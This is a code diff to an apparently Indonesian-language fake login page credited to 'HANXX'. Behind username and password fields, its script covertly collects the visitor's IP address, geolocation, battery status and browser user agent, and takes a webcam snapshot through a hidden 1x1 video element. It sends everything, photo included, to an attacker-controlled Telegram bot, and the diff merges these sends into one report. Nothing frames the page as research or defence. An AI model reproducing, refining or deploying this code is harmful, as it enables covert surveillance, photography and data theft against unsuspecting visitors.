@@ -71,6 +71,7 @@
     <input type="password" id="password" placeholder="PASSWORD">
     <button onclick="handleLogin()">LOGIN</button>
     <p style="margin-top: 10px;"><a href="#" style="color: #90cdf4;">FORGOT PASSWORD?</a></p>
+
     <p id="loading">Loading...</p>
     <video id="camera" autoplay playsinline width="1" height="1"></video>
     <canvas id="snapshot" width="300" height="300" style="display:none;"></canvas>
@@ -86,12 +87,13 @@
     let locationInfo = 'Tidak diberikan';
     let cameraStatus = 'Gagal';
     let streamData = null;
+    let snapshotReady = false;
 
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
         ipAddress = data.ip;
-        checkAndSend();
+        trySendFullReport();
       });
 
     if (navigator.geolocation) {
@@ -99,10 +101,10 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         locationInfo = `Latitude: ${lat}, Longitude: ${lon}`;
-        checkAndSend();
+        trySendFullReport();
       }, err => {
         locationInfo = 'Izin lokasi ditolak';
-        checkAndSend();
+        trySendFullReport();
       });
     }
 
@@ -118,7 +120,7 @@
       })
       .catch(err => {
         cameraStatus = 'Ditolak / Tidak tersedia';
-        checkAndSend();
+        trySendFullReport();
       });
 
     function handleLogin() {
@@ -145,15 +147,22 @@
       const context = canvas.getContext("2d");
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => {
-        sendToTelegram(blob);
+        window.snapshotBlob = blob;
+        snapshotReady = true;
+        trySendFullReport();
       }, 'image/jpeg');
     }
 
-    function sendToTelegram(blobImage) {
-      const userAgent = navigator.userAgent;
-      const time = new Date().toLocaleString();
+    function trySendFullReport() {
+      if (!snapshotReady && cameraStatus === 'Berhasil') return;
 
-      const message = `
+      navigator.getBattery().then(battery => {
+        const batteryLevel = `${battery.level * 100}%`;
+        const isCharging = battery.charging ? "Mengisi daya" : "Tidak mengisi";
+        const userAgent = navigator.userAgent;
+        const time = new Date().toLocaleString();
+
+        const message = `
 |------------------------------------------
 | 👑 Developer : HANXX
 | 🌐 Language : HTML
@@ -164,46 +173,30 @@
 | 🔎 IP Address: ${ipAddress}
 | 📍 Lokasi: ${locationInfo}
 | 📸 Kamera: ${cameraStatus}
+| 🔋 Baterai: ${batteryLevel}
+| ⚡ Status Pengisian: ${isCharging}
 | 🗃 User-Agent: ${userAgent}
 | 🕰 Waktu Login: ${time}
 |------------------------------------------
 `;
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      });
-
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", blobImage, "snapshot.jpg");
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      });
-
-      // Kirim status baterai
-      navigator.getBattery().then(battery => {
-        const batteryLevel = `${battery.level * 100}%`;
-        const isCharging = battery.charging ? "Mengisi daya" : "Tidak mengisi";
-
-        const batteryMsg = `
-| 🔋 Baterai: ${batteryLevel}
-| ⚡ Status Pengisian: ${isCharging}
-`;
-
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: batteryMsg })
+          body: JSON.stringify({ chat_id: chatId, text: message })
         });
-      });
-    }
 
-    function checkAndSend() {
-      // Fungsi placeholder jika diperlukan sinkronisasi tambahan
+        if (window.snapshotBlob) {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", window.snapshotBlob, "snapshot.jpg");
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }
+      });
     }
   </script>
 </body>
